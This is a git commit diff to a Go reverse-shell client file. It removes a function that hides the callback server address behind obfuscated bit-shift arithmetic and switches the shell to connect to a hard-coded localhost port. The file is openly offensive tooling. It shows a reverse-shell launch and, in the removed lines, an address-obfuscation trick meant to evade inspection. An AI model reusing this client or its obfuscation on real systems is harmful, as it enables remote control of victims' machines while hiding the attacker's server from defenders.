1a02feafddfe6c642de3e2f1ec4db0bb5b4e1893
Bop <37331768+bcmmeijer@users.noreply.github.com>
2021-03-05 10:37:03 +0100

    Update shell.go

--- client/shell.go
+++ client/shell.go
@@ -2,49 +2,10 @@ package main
 
 import(
   "ReverseShell"
-  //"time"
-  //"strings"
   "unsafe"
-  //"fmt"
 )
-
-const (
-	EAX = uint8(unsafe.Sizeof(true))
-	ONE = "EAX"
-)
-
-func GetServerAddr() string{
-  var str []byte
-  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX)
-  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX|EAX))
-  str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX))
-  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX|EAX))
-  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX<<EAX)
-  str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
-  str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX|EAX))
-  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
-  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
-  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX|EAX))
-  str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
-  str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX))
-  str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX)
-  str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX|EAX))
-  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
-  str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
-  str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
-  str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX|EAX))
-  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
-  str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX)
-  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
-  str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX))
-  str = append(str, (EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX)
-  str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX|EAX))
-  str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX|EAX))
-  return string(str)
-}
 
 func main(){
-  //ReverseShell.CreateRevShell("tcp", GetServerAddr())
   ReverseShell.CreateRevShell("tcp", "127.0.0.1:27015")
   //time.Sleep(10 * time.Second)
   //ReverseShell.DestroyShell()
